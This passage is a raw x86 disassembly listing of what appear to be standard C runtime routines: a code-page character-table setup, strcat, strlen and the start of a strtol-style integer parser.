  40a4e7:	00 cc                	add    %cl,%ah
  40a4e9:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40a4ea:	40                   	inc    %eax
  40a4eb:	00 d3                	add    %dl,%bl
  40a4ed:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40a4ee:	40                   	inc    %eax
  40a4ef:	00 da                	add    %bl,%dl
  40a4f1:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  40a4f2:	40                   	inc    %eax
  40a4f3:	00 00                	add    %al,(%eax)
  40a4f5:	04 04                	add    $0x4,%al
  40a4f7:	04 01                	add    $0x1,%al
  40a4f9:	04 04                	add    $0x4,%al
  40a4fb:	04 04                	add    $0x4,%al
  40a4fd:	04 04                	add    $0x4,%al
  40a4ff:	04 04                	add    $0x4,%al
  40a501:	04 04                	add    $0x4,%al
  40a503:	04 04                	add    $0x4,%al
  40a505:	02 03                	add    (%ebx),%al
  40a507:	cc                   	int3
  40a508:	cc                   	int3
  40a509:	cc                   	int3
  40a50a:	cc                   	int3
  40a50b:	cc                   	int3
  40a50c:	cc                   	int3
  40a50d:	cc                   	int3
  40a50e:	cc                   	int3
  40a50f:	cc                   	int3
  40a510:	55                   	push   %ebp
  40a511:	8b ec                	mov    %esp,%ebp
  40a513:	51                   	push   %ecx
  40a514:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40a51b:	eb 09                	jmp    0x40a526
  40a51d:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40a520:	83 c0 01             	add    $0x1,%eax
  40a523:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40a526:	81 7d fc 01 01 00 00 	cmpl   $0x101,-0x4(%ebp)
  40a52d:	7d 0c                	jge    0x40a53b
  40a52f:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40a532:	c6 81 20 f1 45 00 00 	movb   $0x0,0x45f120(%ecx)
  40a539:	eb e2                	jmp    0x40a51d
  40a53b:	c7 05 0c f0 45 00 00 	movl   $0x0,0x45f00c
  40a542:	00 00 00 
  40a545:	c7 05 1c f0 45 00 00 	movl   $0x0,0x45f01c
  40a54c:	00 00 00 
  40a54f:	c7 05 24 f2 45 00 00 	movl   $0x0,0x45f224
  40a556:	00 00 00 
  40a559:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)
  40a560:	eb 09                	jmp    0x40a56b
  40a562:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40a565:	83 c2 01             	add    $0x1,%edx
  40a568:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40a56b:	83 7d fc 06          	cmpl   $0x6,-0x4(%ebp)
  40a56f:	7d 0f                	jge    0x40a580
  40a571:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40a574:	66 c7 04 45 10 f0 45 	movw   $0x0,0x45f010(,%eax,2)
  40a57b:	00 00 00 
  40a57e:	eb e2                	jmp    0x40a562
  40a580:	8b e5                	mov    %ebp,%esp
  40a582:	5d                   	pop    %ebp
  40a583:	c3                   	ret
  40a584:	cc                   	int3
  40a585:	cc                   	int3
  40a586:	cc                   	int3
  40a587:	cc                   	int3
  40a588:	cc                   	int3
  40a589:	cc                   	int3
  40a58a:	cc                   	int3
  40a58b:	cc                   	int3
  40a58c:	cc                   	int3
  40a58d:	cc                   	int3
  40a58e:	cc                   	int3
  40a58f:	cc                   	int3
  40a590:	55                   	push   %ebp
  40a591:	8b ec                	mov    %esp,%ebp
  40a593:	81 ec 1c 05 00 00    	sub    $0x51c,%esp
  40a599:	8d 85 e8 fc ff ff    	lea    -0x318(%ebp),%eax
  40a59f:	50                   	push   %eax
  40a5a0:	8b 0d 0c f0 45 00    	mov    0x45f00c,%ecx
  40a5a6:	51                   	push   %ecx
  40a5a7:	ff 15 cc f0 40 00    	call   *0x40f0cc
  40a5ad:	83 f8 01             	cmp    $0x1,%eax
  40a5b0:	0f 85 13 02 00 00    	jne    0x40a7c9
  40a5b6:	c7 85 e4 fa ff ff 00 	movl   $0x0,-0x51c(%ebp)
  40a5bd:	00 00 00 
  40a5c0:	eb 0f                	jmp    0x40a5d1
  40a5c2:	8b 95 e4 fa ff ff    	mov    -0x51c(%ebp),%edx
  40a5c8:	83 c2 01             	add    $0x1,%edx
  40a5cb:	89 95 e4 fa ff ff    	mov    %edx,-0x51c(%ebp)
  40a5d1:	81 bd e4 fa ff ff 00 	cmpl   $0x100,-0x51c(%ebp)
  40a5d8:	01 00 00 
  40a5db:	73 15                	jae    0x40a5f2
  40a5dd:	8b 85 e4 fa ff ff    	mov    -0x51c(%ebp),%eax
  40a5e3:	8a 8d e4 fa ff ff    	mov    -0x51c(%ebp),%cl
  40a5e9:	88 8c 05 fc fc ff ff 	mov    %cl,-0x304(%ebp,%eax,1)
  40a5f0:	eb d0                	jmp    0x40a5c2
  40a5f2:	c6 85 fc fc ff ff 20 	movb   $0x20,-0x304(%ebp)
  40a5f9:	8d 95 ee fc ff ff    	lea    -0x312(%ebp),%edx
  40a5ff:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40a602:	eb 09                	jmp    0x40a60d
  40a604:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40a607:	83 c0 02             	add    $0x2,%eax
  40a60a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40a60d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40a610:	33 d2                	xor    %edx,%edx
  40a612:	8a 11                	mov    (%ecx),%dl
  40a614:	85 d2                	test   %edx,%edx
  40a616:	74 40                	je     0x40a658
  40a618:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40a61b:	33 c9                	xor    %ecx,%ecx
  40a61d:	8a 08                	mov    (%eax),%cl
  40a61f:	89 8d e4 fa ff ff    	mov    %ecx,-0x51c(%ebp)
  40a625:	eb 0f                	jmp    0x40a636
  40a627:	8b 95 e4 fa ff ff    	mov    -0x51c(%ebp),%edx
  40a62d:	83 c2 01             	add    $0x1,%edx
  40a630:	89 95 e4 fa ff ff    	mov    %edx,-0x51c(%ebp)
  40a636:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40a639:	33 c9                	xor    %ecx,%ecx
  40a63b:	8a 48 01             	mov    0x1(%eax),%cl
  40a63e:	39 8d e4 fa ff ff    	cmp    %ecx,-0x51c(%ebp)
  40a644:	77 10                	ja     0x40a656
  40a646:	8b 95 e4 fa ff ff    	mov    -0x51c(%ebp),%edx
  40a64c:	c6 84 15 fc fc ff ff 	movb   $0x20,-0x304(%ebp,%edx,1)
  40a653:	20 
  40a654:	eb d1                	jmp    0x40a627
  40a656:	eb ac                	jmp    0x40a604
  40a658:	6a 00                	push   $0x0
  40a65a:	a1 24 f2 45 00       	mov    0x45f224,%eax
  40a65f:	50                   	push   %eax
  40a660:	8b 0d 0c f0 45 00    	mov    0x45f00c,%ecx
  40a666:	51                   	push   %ecx
  40a667:	8d 95 fc fd ff ff    	lea    -0x204(%ebp),%edx
  40a66d:	52                   	push   %edx
  40a66e:	68 00 01 00 00       	push   $0x100
  40a673:	8d 85 fc fc ff ff    	lea    -0x304(%ebp),%eax
  40a679:	50                   	push   %eax
  40a67a:	6a 01                	push   $0x1
  40a67c:	e8 1f 18 00 00       	call   0x40bea0
  40a681:	83 c4 1c             	add    $0x1c,%esp
  40a684:	6a 00                	push   $0x0
  40a686:	8b 0d 0c f0 45 00    	mov    0x45f00c,%ecx
  40a68c:	51                   	push   %ecx
  40a68d:	68 00 01 00 00       	push   $0x100
  40a692:	8d 95 e8 fb ff ff    	lea    -0x418(%ebp),%edx
  40a698:	52                   	push   %edx
  40a699:	68 00 01 00 00       	push   $0x100
  40a69e:	8d 85 fc fc ff ff    	lea    -0x304(%ebp),%eax
  40a6a4:	50                   	push   %eax
  40a6a5:	68 00 01 00 00       	push   $0x100
  40a6aa:	8b 0d 24 f2 45 00    	mov    0x45f224,%ecx
  40a6b0:	51                   	push   %ecx
  40a6b1:	e8 8a 14 00 00       	call   0x40bb40
  40a6b6:	83 c4 20             	add    $0x20,%esp
  40a6b9:	6a 00                	push   $0x0
  40a6bb:	8b 15 0c f0 45 00    	mov    0x45f00c,%edx
  40a6c1:	52                   	push   %edx
  40a6c2:	68 00 01 00 00       	push   $0x100
  40a6c7:	8d 85 e8 fa ff ff    	lea    -0x518(%ebp),%eax
  40a6cd:	50                   	push   %eax
  40a6ce:	68 00 01 00 00       	push   $0x100
  40a6d3:	8d 8d fc fc ff ff    	lea    -0x304(%ebp),%ecx
  40a6d9:	51                   	push   %ecx
  40a6da:	68 00 02 00 00       	push   $0x200
  40a6df:	8b 15 24 f2 45 00    	mov    0x45f224,%edx
  40a6e5:	52                   	push   %edx
  40a6e6:	e8 55 14 00 00       	call   0x40bb40
  40a6eb:	83 c4 20             	add    $0x20,%esp
  40a6ee:	c7 85 e4 fa ff ff 00 	movl   $0x0,-0x51c(%ebp)
  40a6f5:	00 00 00 
  40a6f8:	eb 0f                	jmp    0x40a709
  40a6fa:	8b 85 e4 fa ff ff    	mov    -0x51c(%ebp),%eax
  40a700:	83 c0 01             	add    $0x1,%eax
  40a703:	89 85 e4 fa ff ff    	mov    %eax,-0x51c(%ebp)
  40a709:	81 bd e4 fa ff ff 00 	cmpl   $0x100,-0x51c(%ebp)
  40a710:	01 00 00 
  40a713:	0f 83 ab 00 00 00    	jae    0x40a7c4
  40a719:	8b 8d e4 fa ff ff    	mov    -0x51c(%ebp),%ecx
  40a71f:	33 d2                	xor    %edx,%edx
  40a721:	66 8b 94 4d fc fd ff 	mov    -0x204(%ebp,%ecx,2),%dx
  40a728:	ff 
  40a729:	83 e2 01             	and    $0x1,%edx
  40a72c:	85 d2                	test   %edx,%edx
  40a72e:	74 36                	je     0x40a766
  40a730:	8b 85 e4 fa ff ff    	mov    -0x51c(%ebp),%eax
  40a736:	8a 88 21 f1 45 00    	mov    0x45f121(%eax),%cl
  40a73c:	80 c9 10             	or     $0x10,%cl
  40a73f:	8b 95 e4 fa ff ff    	mov    -0x51c(%ebp),%edx
  40a745:	88 8a 21 f1 45 00    	mov    %cl,0x45f121(%edx)
  40a74b:	8b 85 e4 fa ff ff    	mov    -0x51c(%ebp),%eax
  40a751:	8b 8d e4 fa ff ff    	mov    -0x51c(%ebp),%ecx
  40a757:	8a 94 0d e8 fb ff ff 	mov    -0x418(%ebp,%ecx,1),%dl
  40a75e:	88 90 20 f0 45 00    	mov    %dl,0x45f020(%eax)
  40a764:	eb 59                	jmp    0x40a7bf
  40a766:	8b 85 e4 fa ff ff    	mov    -0x51c(%ebp),%eax
  40a76c:	33 c9                	xor    %ecx,%ecx
  40a76e:	66 8b 8c 45 fc fd ff 	mov    -0x204(%ebp,%eax,2),%cx
  40a775:	ff 
  40a776:	83 e1 02             	and    $0x2,%ecx
  40a779:	85 c9                	test   %ecx,%ecx
  40a77b:	74 35                	je     0x40a7b2
  40a77d:	8b 95 e4 fa ff ff    	mov    -0x51c(%ebp),%edx
  40a783:	8a 82 21 f1 45 00    	mov    0x45f121(%edx),%al
  40a789:	0c 20                	or     $0x20,%al
  40a78b:	8b 8d e4 fa ff ff    	mov    -0x51c(%ebp),%ecx
  40a791:	88 81 21 f1 45 00    	mov    %al,0x45f121(%ecx)
  40a797:	8b 95 e4 fa ff ff    	mov    -0x51c(%ebp),%edx
  40a79d:	8b 85 e4 fa ff ff    	mov    -0x51c(%ebp),%eax
  40a7a3:	8a 8c 05 e8 fa ff ff 	mov    -0x518(%ebp,%eax,1),%cl
  40a7aa:	88 8a 20 f0 45 00    	mov    %cl,0x45f020(%edx)
  40a7b0:	eb 0d                	jmp    0x40a7bf
  40a7b2:	8b 95 e4 fa ff ff    	mov    -0x51c(%ebp),%edx
  40a7b8:	c6 82 20 f0 45 00 00 	movb   $0x0,0x45f020(%edx)
  40a7bf:	e9 36 ff ff ff       	jmp    0x40a6fa
  40a7c4:	e9 c5 00 00 00       	jmp    0x40a88e
  40a7c9:	c7 85 e4 fa ff ff 00 	movl   $0x0,-0x51c(%ebp)
  40a7d0:	00 00 00 
  40a7d3:	eb 0f                	jmp    0x40a7e4
  40a7d5:	8b 85 e4 fa ff ff    	mov    -0x51c(%ebp),%eax
  40a7db:	83 c0 01             	add    $0x1,%eax
  40a7de:	89 85 e4 fa ff ff    	mov    %eax,-0x51c(%ebp)
  40a7e4:	81 bd e4 fa ff ff 00 	cmpl   $0x100,-0x51c(%ebp)
  40a7eb:	01 00 00 
  40a7ee:	0f 83 9a 00 00 00    	jae    0x40a88e
  40a7f4:	83 bd e4 fa ff ff 41 	cmpl   $0x41,-0x51c(%ebp)
  40a7fb:	72 3b                	jb     0x40a838
  40a7fd:	83 bd e4 fa ff ff 5a 	cmpl   $0x5a,-0x51c(%ebp)
  40a804:	77 32                	ja     0x40a838
  40a806:	8b 8d e4 fa ff ff    	mov    -0x51c(%ebp),%ecx
  40a80c:	8a 91 21 f1 45 00    	mov    0x45f121(%ecx),%dl
  40a812:	80 ca 10             	or     $0x10,%dl
  40a815:	8b 85 e4 fa ff ff    	mov    -0x51c(%ebp),%eax
  40a81b:	88 90 21 f1 45 00    	mov    %dl,0x45f121(%eax)
  40a821:	8b 8d e4 fa ff ff    	mov    -0x51c(%ebp),%ecx
  40a827:	83 c1 20             	add    $0x20,%ecx
  40a82a:	8b 95 e4 fa ff ff    	mov    -0x51c(%ebp),%edx
  40a830:	88 8a 20 f0 45 00    	mov    %cl,0x45f020(%edx)
  40a836:	eb 51                	jmp    0x40a889
  40a838:	83 bd e4 fa ff ff 61 	cmpl   $0x61,-0x51c(%ebp)
  40a83f:	72 3b                	jb     0x40a87c
  40a841:	83 bd e4 fa ff ff 7a 	cmpl   $0x7a,-0x51c(%ebp)
  40a848:	77 32                	ja     0x40a87c
  40a84a:	8b 85 e4 fa ff ff    	mov    -0x51c(%ebp),%eax
  40a850:	8a 88 21 f1 45 00    	mov    0x45f121(%eax),%cl
  40a856:	80 c9 20             	or     $0x20,%cl
  40a859:	8b 95 e4 fa ff ff    	mov    -0x51c(%ebp),%edx
  40a85f:	88 8a 21 f1 45 00    	mov    %cl,0x45f121(%edx)
  40a865:	8b 85 e4 fa ff ff    	mov    -0x51c(%ebp),%eax
  40a86b:	83 e8 20             	sub    $0x20,%eax
  40a86e:	8b 8d e4 fa ff ff    	mov    -0x51c(%ebp),%ecx
  40a874:	88 81 20 f0 45 00    	mov    %al,0x45f020(%ecx)
  40a87a:	eb 0d                	jmp    0x40a889
  40a87c:	8b 95 e4 fa ff ff    	mov    -0x51c(%ebp),%edx
  40a882:	c6 82 20 f0 45 00 00 	movb   $0x0,0x45f020(%edx)
  40a889:	e9 47 ff ff ff       	jmp    0x40a7d5
  40a88e:	8b e5                	mov    %ebp,%esp
  40a890:	5d                   	pop    %ebp
  40a891:	c3                   	ret
  40a892:	cc                   	int3
  40a893:	cc                   	int3
  40a894:	cc                   	int3
  40a895:	cc                   	int3
  40a896:	cc                   	int3
  40a897:	cc                   	int3
  40a898:	cc                   	int3
  40a899:	cc                   	int3
  40a89a:	cc                   	int3
  40a89b:	cc                   	int3
  40a89c:	cc                   	int3
  40a89d:	cc                   	int3
  40a89e:	cc                   	int3
  40a89f:	cc                   	int3
  40a8a0:	55                   	push   %ebp
  40a8a1:	8b ec                	mov    %esp,%ebp
  40a8a3:	83 3d 68 f3 45 00 00 	cmpl   $0x0,0x45f368
  40a8aa:	75 14                	jne    0x40a8c0
  40a8ac:	6a fd                	push   $0xfffffffd
  40a8ae:	e8 2d f8 ff ff       	call   0x40a0e0
  40a8b3:	83 c4 04             	add    $0x4,%esp
  40a8b6:	c7 05 68 f3 45 00 01 	movl   $0x1,0x45f368
  40a8bd:	00 00 00 
  40a8c0:	5d                   	pop    %ebp
  40a8c1:	c3                   	ret
  40a8c2:	cc                   	int3
  40a8c3:	cc                   	int3
  40a8c4:	cc                   	int3
  40a8c5:	cc                   	int3
  40a8c6:	cc                   	int3
  40a8c7:	cc                   	int3
  40a8c8:	cc                   	int3
  40a8c9:	cc                   	int3
  40a8ca:	cc                   	int3
  40a8cb:	cc                   	int3
  40a8cc:	cc                   	int3
  40a8cd:	cc                   	int3
  40a8ce:	cc                   	int3
  40a8cf:	cc                   	int3
  40a8d0:	57                   	push   %edi
  40a8d1:	8b 7c 24 08          	mov    0x8(%esp),%edi
  40a8d5:	eb 6a                	jmp    0x40a941
  40a8d7:	8d a4 24 00 00 00 00 	lea    0x0(%esp),%esp
  40a8de:	8b ff                	mov    %edi,%edi
  40a8e0:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40a8e4:	57                   	push   %edi
  40a8e5:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  40a8eb:	74 0f                	je     0x40a8fc
  40a8ed:	8a 01                	mov    (%ecx),%al
  40a8ef:	41                   	inc    %ecx
  40a8f0:	84 c0                	test   %al,%al
  40a8f2:	74 3b                	je     0x40a92f
  40a8f4:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  40a8fa:	75 f1                	jne    0x40a8ed
  40a8fc:	8b 01                	mov    (%ecx),%eax
  40a8fe:	ba ff fe fe 7e       	mov    $0x7efefeff,%edx
  40a903:	03 d0                	add    %eax,%edx
  40a905:	83 f0 ff             	xor    $0xffffffff,%eax
  40a908:	33 c2                	xor    %edx,%eax
  40a90a:	83 c1 04             	add    $0x4,%ecx
  40a90d:	a9 00 01 01 81       	test   $0x81010100,%eax
  40a912:	74 e8                	je     0x40a8fc
  40a914:	8b 41 fc             	mov    -0x4(%ecx),%eax
  40a917:	84 c0                	test   %al,%al
  40a919:	74 23                	je     0x40a93e
  40a91b:	84 e4                	test   %ah,%ah
  40a91d:	74 1a                	je     0x40a939
  40a91f:	a9 00 00 ff 00       	test   $0xff0000,%eax
  40a924:	74 0e                	je     0x40a934
  40a926:	a9 00 00 00 ff       	test   $0xff000000,%eax
  40a92b:	74 02                	je     0x40a92f
  40a92d:	eb cd                	jmp    0x40a8fc
  40a92f:	8d 79 ff             	lea    -0x1(%ecx),%edi
  40a932:	eb 0d                	jmp    0x40a941
  40a934:	8d 79 fe             	lea    -0x2(%ecx),%edi
  40a937:	eb 08                	jmp    0x40a941
  40a939:	8d 79 fd             	lea    -0x3(%ecx),%edi
  40a93c:	eb 03                	jmp    0x40a941
  40a93e:	8d 79 fc             	lea    -0x4(%ecx),%edi
  40a941:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  40a945:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  40a94b:	74 19                	je     0x40a966
  40a94d:	8a 11                	mov    (%ecx),%dl
  40a94f:	41                   	inc    %ecx
  40a950:	84 d2                	test   %dl,%dl
  40a952:	74 64                	je     0x40a9b8
  40a954:	88 17                	mov    %dl,(%edi)
  40a956:	47                   	inc    %edi
  40a957:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  40a95d:	75 ee                	jne    0x40a94d
  40a95f:	eb 05                	jmp    0x40a966
  40a961:	89 17                	mov    %edx,(%edi)
  40a963:	83 c7 04             	add    $0x4,%edi
  40a966:	ba ff fe fe 7e       	mov    $0x7efefeff,%edx
  40a96b:	8b 01                	mov    (%ecx),%eax
  40a96d:	03 d0                	add    %eax,%edx
  40a96f:	83 f0 ff             	xor    $0xffffffff,%eax
  40a972:	33 c2                	xor    %edx,%eax
  40a974:	8b 11                	mov    (%ecx),%edx
  40a976:	83 c1 04             	add    $0x4,%ecx
  40a979:	a9 00 01 01 81       	test   $0x81010100,%eax
  40a97e:	74 e1                	je     0x40a961
  40a980:	84 d2                	test   %dl,%dl
  40a982:	74 34                	je     0x40a9b8
  40a984:	84 f6                	test   %dh,%dh
  40a986:	74 27                	je     0x40a9af
  40a988:	f7 c2 00 00 ff 00    	test   $0xff0000,%edx
  40a98e:	74 12                	je     0x40a9a2
  40a990:	f7 c2 00 00 00 ff    	test   $0xff000000,%edx
  40a996:	74 02                	je     0x40a99a
  40a998:	eb c7                	jmp    0x40a961
  40a99a:	89 17                	mov    %edx,(%edi)
  40a99c:	8b 44 24 08          	mov    0x8(%esp),%eax
  40a9a0:	5f                   	pop    %edi
  40a9a1:	c3                   	ret
  40a9a2:	66 89 17             	mov    %dx,(%edi)
  40a9a5:	8b 44 24 08          	mov    0x8(%esp),%eax
  40a9a9:	c6 47 02 00          	movb   $0x0,0x2(%edi)
  40a9ad:	5f                   	pop    %edi
  40a9ae:	c3                   	ret
  40a9af:	66 89 17             	mov    %dx,(%edi)
  40a9b2:	8b 44 24 08          	mov    0x8(%esp),%eax
  40a9b6:	5f                   	pop    %edi
  40a9b7:	c3                   	ret
  40a9b8:	88 17                	mov    %dl,(%edi)
  40a9ba:	8b 44 24 08          	mov    0x8(%esp),%eax
  40a9be:	5f                   	pop    %edi
  40a9bf:	c3                   	ret
  40a9c0:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40a9c4:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  40a9ca:	74 14                	je     0x40a9e0
  40a9cc:	8a 01                	mov    (%ecx),%al
  40a9ce:	41                   	inc    %ecx
  40a9cf:	84 c0                	test   %al,%al
  40a9d1:	74 40                	je     0x40aa13
  40a9d3:	f7 c1 03 00 00 00    	test   $0x3,%ecx
  40a9d9:	75 f1                	jne    0x40a9cc
  40a9db:	05 00 00 00 00       	add    $0x0,%eax
  40a9e0:	8b 01                	mov    (%ecx),%eax
  40a9e2:	ba ff fe fe 7e       	mov    $0x7efefeff,%edx
  40a9e7:	03 d0                	add    %eax,%edx
  40a9e9:	83 f0 ff             	xor    $0xffffffff,%eax
  40a9ec:	33 c2                	xor    %edx,%eax
  40a9ee:	83 c1 04             	add    $0x4,%ecx
  40a9f1:	a9 00 01 01 81       	test   $0x81010100,%eax
  40a9f6:	74 e8                	je     0x40a9e0
  40a9f8:	8b 41 fc             	mov    -0x4(%ecx),%eax
  40a9fb:	84 c0                	test   %al,%al
  40a9fd:	74 32                	je     0x40aa31
  40a9ff:	84 e4                	test   %ah,%ah
  40aa01:	74 24                	je     0x40aa27
  40aa03:	a9 00 00 ff 00       	test   $0xff0000,%eax
  40aa08:	74 13                	je     0x40aa1d
  40aa0a:	a9 00 00 00 ff       	test   $0xff000000,%eax
  40aa0f:	74 02                	je     0x40aa13
  40aa11:	eb cd                	jmp    0x40a9e0
  40aa13:	8d 41 ff             	lea    -0x1(%ecx),%eax
  40aa16:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40aa1a:	2b c1                	sub    %ecx,%eax
  40aa1c:	c3                   	ret
  40aa1d:	8d 41 fe             	lea    -0x2(%ecx),%eax
  40aa20:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40aa24:	2b c1                	sub    %ecx,%eax
  40aa26:	c3                   	ret
  40aa27:	8d 41 fd             	lea    -0x3(%ecx),%eax
  40aa2a:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40aa2e:	2b c1                	sub    %ecx,%eax
  40aa30:	c3                   	ret
  40aa31:	8d 41 fc             	lea    -0x4(%ecx),%eax
  40aa34:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40aa38:	2b c1                	sub    %ecx,%eax
  40aa3a:	c3                   	ret
  40aa3b:	cc                   	int3
  40aa3c:	cc                   	int3
  40aa3d:	cc                   	int3
  40aa3e:	cc                   	int3
  40aa3f:	cc                   	int3
  40aa40:	55                   	push   %ebp
  40aa41:	8b ec                	mov    %esp,%ebp
  40aa43:	6a 00                	push   $0x0
  40aa45:	8b 45 10             	mov    0x10(%ebp),%eax
  40aa48:	50                   	push   %eax
  40aa49:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40aa4c:	51                   	push   %ecx
  40aa4d:	8b 55 08             	mov    0x8(%ebp),%edx
  40aa50:	52                   	push   %edx
  40aa51:	e8 0a 00 00 00       	call   0x40aa60
  40aa56:	83 c4 10             	add    $0x10,%esp
  40aa59:	5d                   	pop    %ebp
  40aa5a:	c3                   	ret
  40aa5b:	cc                   	int3
  40aa5c:	cc                   	int3
  40aa5d:	cc                   	int3
  40aa5e:	cc                   	int3
  40aa5f:	cc                   	int3
  40aa60:	55                   	push   %ebp
  40aa61:	8b ec                	mov    %esp,%ebp
  40aa63:	83 ec 20             	sub    $0x20,%esp
  40aa66:	8b 45 08             	mov    0x8(%ebp),%eax
  40aa69:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40aa6c:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)
  40aa73:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40aa76:	8a 11                	mov    (%ecx),%dl
  40aa78:	88 55 f8             	mov    %dl,-0x8(%ebp)
  40aa7b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40aa7e:	83 c0 01             	add    $0x1,%eax
  40aa81:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40aa84:	83 3d 10 d5 45 00 01 	cmpl   $0x1,0x45d510
  40aa8b:	7e 19                	jle    0x40aaa6
  40aa8d:	6a 08                	push   $0x8
  40aa8f:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40aa92:	81 e1 ff 00 00 00    	and    $0xff,%ecx
  40aa98:	51                   	push   %ecx
  40aa99:	e8 22 0a 00 00       	call   0x40b4c0
  40aa9e:	83 c4 08             	add    $0x8,%esp
  40aaa1:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40aaa4:	eb 1a                	jmp    0x40aac0
  40aaa6:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40aaa9:	81 e2 ff 00 00 00    	and    $0xff,%edx
  40aaaf:	a1 04 d3 45 00       	mov    0x45d304,%eax
  40aab4:	33 c9                	xor    %ecx,%ecx
  40aab6:	66 8b 0c 50          	mov    (%eax,%edx,2),%cx
  40aaba:	83 e1 08             	and    $0x8,%ecx
  40aabd:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  40aac0:	83 7d e8 00          	cmpl   $0x0,-0x18(%ebp)
  40aac4:	74 13                	je     0x40aad9
  40aac6:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40aac9:	8a 02                	mov    (%edx),%al
  40aacb:	88 45 f8             	mov    %al,-0x8(%ebp)
  40aace:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40aad1:	83 c1 01             	add    $0x1,%ecx
  40aad4:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40aad7:	eb ab                	jmp    0x40aa84
  40aad9:	0f be 55 f8          	movsbl -0x8(%ebp),%edx
  40aadd:	83 fa 2d             	cmp    $0x2d,%edx
  40aae0:	75 1b                	jne    0x40aafd
  40aae2:	8b 45 14             	mov    0x14(%ebp),%eax
  40aae5:	0c 02                	or     $0x2,%al
  40aae7:	89 45 14             	mov    %eax,0x14(%ebp)
  40aaea:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40aaed:	8a 11                	mov    (%ecx),%dl
  40aaef:	88 55 f8             	mov    %dl,-0x8(%ebp)
  40aaf2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40aaf5:	83 c0 01             	add    $0x1,%eax
  40aaf8:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40aafb:	eb 1a                	jmp    0x40ab17
  40aafd:	0f be 4d f8          	movsbl -0x8(%ebp),%ecx
  40ab01:	83 f9 2b             	cmp    $0x2b,%ecx
  40ab04:	75 11                	jne    0x40ab17
  40ab06:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40ab09:	8a 02                	mov    (%edx),%al
  40ab0b:	88 45 f8             	mov    %al,-0x8(%ebp)
  40ab0e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40ab11:	83 c1 01             	add    $0x1,%ecx
  40ab14:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40ab17:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  40ab1b:	7c 0c                	jl     0x40ab29
  40ab1d:	83 7d 10 01          	cmpl   $0x1,0x10(%ebp)
  40ab21:	74 06                	je     0x40ab29
  40ab23:	83 7d 10 24          	cmpl   $0x24,0x10(%ebp)
  40ab27:	7e 15                	jle    0x40ab3e
  40ab29:	83 7d 0c 00          	cmpl   $0x0,0xc(%ebp)
  40ab2d:	74 08                	je     0x40ab37
  40ab2f:	8b 55 0c             	mov    0xc(%ebp),%edx
  40ab32:	8b 45 08             	mov    0x8(%ebp),%eax
  40ab35:	89 02                	mov    %eax,(%edx)
  40ab37:	33 c0                	xor    %eax,%eax
  40ab39:	e9 4f 02 00 00       	jmp    0x40ad8d
  40ab3e:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  40ab42:	75 38                	jne    0x40ab7c
  40ab44:	0f be 4d f8          	movsbl -0x8(%ebp),%ecx
  40ab48:	83 f9 30             	cmp    $0x30,%ecx
  40ab4b:	74 09                	je     0x40ab56
  40ab4d:	c7 45 10 0a 00 00 00 	movl   $0xa,0x10(%ebp)
  40ab54:	eb 26                	jmp    0x40ab7c
  40ab56:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40ab59:	0f be 02             	movsbl (%edx),%eax
  40ab5c:	83 f8 78             	cmp    $0x78,%eax
  40ab5f:	74 0b                	je     0x40ab6c
  40ab61:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40ab64:	0f be 11             	movsbl (%ecx),%edx
  40ab67:	83 fa 58             	cmp    $0x58,%edx
  40ab6a:	75 09                	jne    0x40ab75
  40ab6c:	c7 45 10 10 00 00 00 	movl   $0x10,0x10(%ebp)
  40ab73:	eb 07                	jmp    0x40ab7c
  40ab75:	c7 45 10 08 00 00 00 	movl   $0x8,0x10(%ebp)
  40ab7c:	83 7d 10 10          	cmpl   $0x10,0x10(%ebp)
  40ab80:	75 39                	jne    0x40abbb
  40ab82:	0f be 45 f8          	movsbl -0x8(%ebp),%eax
  40ab86:	83 f8 30             	cmp    $0x30,%eax
  40ab89:	75 30                	jne    0x40abbb
